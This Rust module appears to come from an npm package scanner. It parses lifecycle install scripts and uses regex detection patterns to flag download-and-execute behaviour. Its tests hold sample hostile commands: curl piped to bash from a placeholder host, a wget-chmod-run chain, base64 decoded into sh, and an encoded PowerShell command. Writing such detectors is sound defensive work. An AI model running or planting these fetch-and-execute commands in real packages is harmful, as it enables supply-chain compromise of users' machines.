//! Reading npm lifecycle scripts (`"postinstall": "node install.js"`).
//!
//! Scripts are shell commands. We do not run them; we split them into simple
//! commands and words (handling quotes and `&&`, `||`, `;`, `|`), then work
//! out what they would run: a JavaScript file, inline `node -e` code, a shell
//! script, or another npm script. This is a small subset of shell syntax,
//! enough for the scripts packages actually ship.

use super::text::LazyRegex;

/// Something an install script runs.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum ScriptTarget {
    /// `node <file>` or `./file.js`: a path relative to the package root.
    JsFile(String),
    /// `node -e "<code>"`
    InlineJs(String),
    /// `sh install.sh`, `./setup.sh`
    ShellFile(String),
    /// `npm run <name>`: another entry in `scripts`.
    NpmRun(String),
}

/// Split a command line into simple commands, each a list of words.
pub fn split_commands(command: &str) -> Vec<Vec<String>> {
    let mut commands = Vec::new();
    let mut words: Vec<String> = Vec::new();
    let mut word = String::new();
    let mut in_word = false;
    let mut chars = command.chars().peekable();
    // `quote` is the open quote character while inside quotes.
    let mut quote: Option<char> = None;

    // Small closures that finish the current word / command.
    let end_word = |word: &mut String, words: &mut Vec<String>, in_word: &mut bool| {
        if *in_word {
            words.push(std::mem::take(word));
            *in_word = false;
        }
    };

    while let Some(c) = chars.next() {
        match quote {
            Some(q) => {
                if c == q {
                    quote = None;
                } else if c == '\\' && q == '"' {
                    if let Some(next) = chars.next() {
                        word.push(next);
                    }
                } else {
                    word.push(c);
                }
            }
            None => match c {
                '\'' | '"' => {
                    quote = Some(c);
                    in_word = true;
                }
                '\\' => {
                    if let Some(next) = chars.next() {
                        word.push(next);
                        in_word = true;
                    }
                }
                ' ' | '\t' => end_word(&mut word, &mut words, &mut in_word),
                '&' | '|' | ';' | '\n' | '(' | ')' => {
                    end_word(&mut word, &mut words, &mut in_word);
                    if !words.is_empty() {
                        commands.push(std::mem::take(&mut words));
                    }
                    // Treat "&&" and "||" as one operator.
                    if (c == '&' || c == '|') && chars.peek() == Some(&c) {
                        chars.next();
                    }
                }
                _ => {
                    word.push(c);
                    in_word = true;
                }
            },
        }
    }
    end_word(&mut word, &mut words, &mut in_word);
    if !words.is_empty() {
        commands.push(words);
    }
    commands
}

/// The program a simple command runs, after skipping `FOO=bar` assignments
/// and wrappers such as `env`, `cross-env`, `npx` and `sudo`. Returns the
/// index of the program word.
fn program_index(words: &[String]) -> Option<usize> {
    let mut i = 0;
    while let Some(w) = words.get(i) {
        let is_assignment = w
            .split_once('=')
            .is_some_and(|(name, _)| !name.is_empty() && !name.contains('/'));
        let is_wrapper = matches!(
            basename(w),
            "env" | "cross-env" | "npx" | "exec" | "sudo" | "nohup" | "command"
        );
        if is_assignment || is_wrapper {
            i += 1;
        } else {
            return Some(i);
        }
    }
    None
}

/// `/usr/bin/node` -> `node`.
fn basename(word: &str) -> &str {
    word.rsplit('/').next().unwrap_or(word)
}

/// The program names of every simple command, for example
/// `["prebuild-install", "node-gyp"]` for `prebuild-install || node-gyp rebuild`.
pub fn programs(command: &str) -> Vec<String> {
    split_commands(command)
        .iter()
        .filter_map(|words| {
            program_index(words).and_then(|i| words.get(i).map(|w| basename(w).to_string()))
        })
        .collect()
}

fn is_js_path(word: &str) -> bool {
    [".js", ".cjs", ".mjs"]
        .iter()
        .any(|ext| word.ends_with(ext))
}

fn is_shell_path(word: &str) -> bool {
    [".sh", ".bash", ".ps1", ".bat", ".cmd"]
        .iter()
        .any(|ext| word.ends_with(ext))
}

/// What a lifecycle script would run.
pub fn script_targets(command: &str) -> Vec<ScriptTarget> {
    let mut targets = Vec::new();
    for words in split_commands(command) {
        let Some(start) = program_index(&words) else {
            continue;
        };
        let program = basename(&words[start]);
        let args = &words[start + 1..];
        match program {
            "node" | "nodejs" => {
                let mut i = 0;
                while let Some(arg) = args.get(i) {
                    match arg.as_str() {
                        "-e" | "--eval" | "-p" | "--print" => {
                            if let Some(code) = args.get(i + 1) {
                                targets.push(ScriptTarget::InlineJs(code.clone()));
                            }
                            break;
                        }
                        // `-r ./preload.js` also runs a file.
                        "-r" | "--require" | "--import" => {
                            if let Some(file) = args.get(i + 1) {
                                if file.starts_with('.') {
                                    targets.push(ScriptTarget::JsFile(file.clone()));
                                }
                            }
                            i += 2;
                        }
                        a if a.starts_with("--eval=") => {
                            targets.push(ScriptTarget::InlineJs(a["--eval=".len()..].to_string()));
                            break;
                        }
                        a if a.starts_with('-') => i += 1,
                        file => {
                            targets.push(ScriptTarget::JsFile(file.to_string()));
                            break;
                        }
                    }
                }
            }
            "sh" | "bash" | "zsh" | "dash" | "pwsh" | "powershell" => {
                if let Some(file) = args.iter().find(|a| !a.starts_with('-')) {
                    if is_shell_path(file) {
                        targets.push(ScriptTarget::ShellFile(file.clone()));
                    }
                }
            }
            "npm" | "yarn" | "pnpm" => {
                if let (Some(sub), Some(name)) = (args.first(), args.get(1)) {
                    if sub == "run" || sub == "run-script" {
                        targets.push(ScriptTarget::NpmRun(name.clone()));
                    }
                }
            }
            _ => {
                let word = &words[start];
                if is_js_path(word) {
                    targets.push(ScriptTarget::JsFile(word.clone()));
                } else if is_shell_path(word) {
                    targets.push(ScriptTarget::ShellFile(word.clone()));
                }
            }
        }
    }
    targets
}

/// A download-and-execute pattern for LW002. `explanation` completes the
/// sentence "The postinstall script ...".
pub struct RemoteExecPattern {
    pub regex: &'static LazyRegex,
    pub explanation: &'static str,
}

static CURL_PIPE_SHELL: LazyRegex =
    LazyRegex::new(r"(?i)\b(curl|wget)\b[^|;&\n]*\|\s*(sudo\s+)?(ba|z|da|k)?sh\b");
static CURL_THEN_RUN: LazyRegex = LazyRegex::new(
    r"(?i)\b(curl|wget)\b[^;&\n]*(&&|;)\s*(sudo\s+)?((ba|z|da|k)?sh\s|chmod\s+[+0-7]*x|\./|source\s|\.\s)",
);
static NODE_EVAL_NETWORK: LazyRegex = LazyRegex::new(
    r#"(?i)\bnode(js)?\s+(-e|--eval|-p|--print)\b.*(https?://|require\(\s*['"](node:)?(https?|net|dns|dgram|tls|http2)['"]\s*\)|\bfetch\s*\()"#,
);
static POWERSHELL_ENCODED: LazyRegex =
    LazyRegex::new(r"(?i)\b(powershell|pwsh)(\.exe)?\b.*\s-(e|ec|en|enc|enco|encodedcommand)\b");
static POWERSHELL_DOWNLOAD: LazyRegex = LazyRegex::new(
    r"(?i)\b(invoke-webrequest|invoke-restmethod|iwr|irm|downloadstring|downloadfile|start-bitstransfer|net\.webclient|invoke-expression|iex)\b",
);
static BASE64_TO_SHELL: LazyRegex = LazyRegex::new(
    r"(?i)\bbase64\s+(-d|-D|--decode)\b[^\n]*\|\s*(sudo\s+)?((ba|z|da|k)?sh|node|python[0-9.]*|perl)\b",
);
static EVAL_BASE64: LazyRegex = LazyRegex::new(
    r#"(?i)(\beval\b[^\n]*\bbase64\s+(-d|--decode)|\b(eval|Function)\s*\([^\n]*(atob\s*\(|['"]base64['"]))"#,
);
static PYTHON_NETWORK: LazyRegex =
    LazyRegex::new(r"(?i)\bpython[0-9.]*\s+-c\b.*\b(urllib|requests|socket|http\.client)\b");

pub static REMOTE_EXEC_PATTERNS: [RemoteExecPattern; 8] = [
    RemoteExecPattern {
        regex: &CURL_PIPE_SHELL,
        explanation: "downloads a script with curl/wget and pipes it into a shell",
    },
    RemoteExecPattern {
        regex: &CURL_THEN_RUN,
        explanation: "downloads a file with curl/wget and then executes it",
    },
    RemoteExecPattern {
        regex: &NODE_EVAL_NETWORK,
        explanation: "runs inline Node.js code (node -e) that uses the network",
    },
    RemoteExecPattern {
        regex: &POWERSHELL_ENCODED,
        explanation: "runs a base64-encoded PowerShell command (-EncodedCommand)",
    },
    RemoteExecPattern {
        regex: &POWERSHELL_DOWNLOAD,
        explanation: "uses PowerShell download or Invoke-Expression commands",
    },
    RemoteExecPattern {
        regex: &BASE64_TO_SHELL,
        explanation: "decodes base64 data and pipes it into an interpreter",
    },
    RemoteExecPattern {
        regex: &EVAL_BASE64,
        explanation: "evaluates base64-decoded code",
    },
    RemoteExecPattern {
        regex: &PYTHON_NETWORK,
        explanation: "runs inline Python code that uses the network",
    },
];

#[cfg(test)]
mod tests {
    use super::*;

    fn s(v: &[&str]) -> Vec<String> {
        v.iter().map(|x| x.to_string()).collect()
    }

    #[test]
    fn splits_operators_and_quotes() {
        assert_eq!(
            split_commands(r#"node a.js && echo "x && y" || true; sh 'b c.sh' | cat"#),
            vec![
                s(&["node", "a.js"]),
                s(&["echo", "x && y"]),
                s(&["true"]),
                s(&["sh", "b c.sh"]),
                s(&["cat"]),
            ]
        );
    }

    #[test]
    fn finds_script_targets() {
        assert_eq!(
            script_targets("node ./scripts/install.js --foo"),
            [ScriptTarget::JsFile("./scripts/install.js".into())]
        );
        assert_eq!(
            script_targets(r#"FOO=1 node -e "require('https').get('x')""#),
            [ScriptTarget::InlineJs("require('https').get('x')".into())]
        );
        assert_eq!(
            script_targets("node --max-old-space-size=100 -r ./pre.js main"),
            [
                ScriptTarget::JsFile("./pre.js".into()),
                ScriptTarget::JsFile("main".into())
            ]
        );
        assert_eq!(
            script_targets("bash install.sh && npm run build && ./post.js"),
            [
                ScriptTarget::ShellFile("install.sh".into()),
                ScriptTarget::NpmRun("build".into()),
                ScriptTarget::JsFile("./post.js".into())
            ]
        );
        assert!(script_targets("node-gyp rebuild").is_empty());
    }

    #[test]
    fn program_names_skip_wrappers() {
        assert_eq!(
            programs("prebuild-install || npx node-gyp rebuild"),
            ["prebuild-install", "node-gyp"]
        );
        assert_eq!(programs("cross-env A=1 /usr/bin/node x.js"), ["node"]);
    }

    #[test]
    fn remote_exec_patterns() {
        let matches = |cmd: &str| {
            REMOTE_EXEC_PATTERNS
                .iter()
                .filter(|p| p.regex.is_match(cmd))
                .count()
        };
        for re in &REMOTE_EXEC_PATTERNS {
            assert!(re.regex.compiles());
        }
        assert_eq!(matches("curl -s https://example.invalid/x.sh | bash"), 1);
        assert_eq!(
            matches("wget -q -O /tmp/p http://203.0.113.5/p && chmod +x /tmp/p && /tmp/p"),
            1
        );
        assert_eq!(matches(r#"node -e "require('https').get('https://x')""#), 1);
        assert_eq!(matches("powershell -NoP -enc SQBFAFgA"), 1);
        assert_eq!(matches("echo aWQ= | base64 -d | sh"), 1);
        assert_eq!(matches("node-gyp rebuild"), 0);
        assert_eq!(matches("node install.js"), 0);
        assert_eq!(matches("curl --version"), 0);
    }
}
